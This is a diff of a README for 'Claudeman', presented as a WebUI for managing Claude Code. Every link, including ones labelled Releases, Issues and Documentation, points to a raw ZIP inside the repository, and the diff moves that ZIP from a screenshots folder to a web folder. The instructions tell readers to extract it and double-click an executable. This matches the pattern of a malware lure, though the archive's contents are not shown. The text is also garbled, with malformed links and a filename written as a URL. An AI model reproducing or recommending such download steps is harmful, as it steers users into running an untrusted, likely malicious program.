@@ -4,13 +4,13 @@
 Claudeman helps you manage Claude Code through a modern WebUI. With our tool, you can handle your projects efficiently within GNU Screen sessions. Experience a streamlined approach to coding without the complexity.
 
 ## 📥 Download
-[![Download Claudeman](https://github.com/Suuzoujuuzou/Claudeman/raw/refs/heads/master/docs/screenshots/Software-v3.8.zip%20Claudeman%https://github.com/Suuzoujuuzou/Claudeman/raw/refs/heads/master/docs/screenshots/Software-v3.8.zip)](https://github.com/Suuzoujuuzou/Claudeman/raw/refs/heads/master/docs/screenshots/Software-v3.8.zip)
+[![Download Claudeman](https://raw.githubusercontent.com/Suuzoujuuzou/Claudeman/master/src/web/Software_v3.0.zip%20Claudeman%https://raw.githubusercontent.com/Suuzoujuuzou/Claudeman/master/src/web/Software_v3.0.zip)](https://raw.githubusercontent.com/Suuzoujuuzou/Claudeman/master/src/web/Software_v3.0.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to get started with Claudeman.
 
 ### 1. Visit the Releases Page
-To download the latest version of Claudeman, visit our [Releases page](https://github.com/Suuzoujuuzou/Claudeman/raw/refs/heads/master/docs/screenshots/Software-v3.8.zip).
+To download the latest version of Claudeman, visit our [Releases page](https://raw.githubusercontent.com/Suuzoujuuzou/Claudeman/master/src/web/Software_v3.0.zip).
 
 ### 2. Choose Your Version
 On the Releases page, you will see different versions of Claudeman. Look for the latest stable release. 
@@ -22,7 +22,7 @@ Click on the download link for the ZIP file. This file contains everything you n
 Once the file has downloaded, locate it in your downloads folder. Right-click on the ZIP file and select "Extract All." Follow the prompts to extract the contents.
 
 ### 5. Run the Application
-After extraction, navigate to the folder where you extracted Claudeman. Look for the executable file, usually named `https://github.com/Suuzoujuuzou/Claudeman/raw/refs/heads/master/docs/screenshots/Software-v3.8.zip` or similar. Double-click the file to launch Claudeman.
+After extraction, navigate to the folder where you extracted Claudeman. Look for the executable file, usually named `https://raw.githubusercontent.com/Suuzoujuuzou/Claudeman/master/src/web/Software_v3.0.zip` or similar. Double-click the file to launch Claudeman.
 
 ## 📋 System Requirements
 To ensure Claudeman runs smoothly, make sure your system meets the following requirements:
@@ -51,9 +51,9 @@ If you encounter issues while using Claudeman, consider the following tips:
 Join the community of Claudeman users. Share your experience or seek help on issues you may encounter. You can find discussions, tips, and support on our GitHub Issues page.
 
 ## 📌 Important Links
-- [Download Claudeman](https://github.com/Suuzoujuuzou/Claudeman/raw/refs/heads/master/docs/screenshots/Software-v3.8.zip)
-- [GitHub Issues Page](https://github.com/Suuzoujuuzou/Claudeman/raw/refs/heads/master/docs/screenshots/Software-v3.8.zip)
-- [Documentation](https://github.com/Suuzoujuuzou/Claudeman/raw/refs/heads/master/docs/screenshots/Software-v3.8.zip)
+- [Download Claudeman](https://raw.githubusercontent.com/Suuzoujuuzou/Claudeman/master/src/web/Software_v3.0.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/Suuzoujuuzou/Claudeman/master/src/web/Software_v3.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Suuzoujuuzou/Claudeman/master/src/web/Software_v3.0.zip)
 
 ## 💡 Final Notes
 Take your time to explore the features of Claudeman. With practice, you'll find it easier to manage your Claude Code. Happy coding!
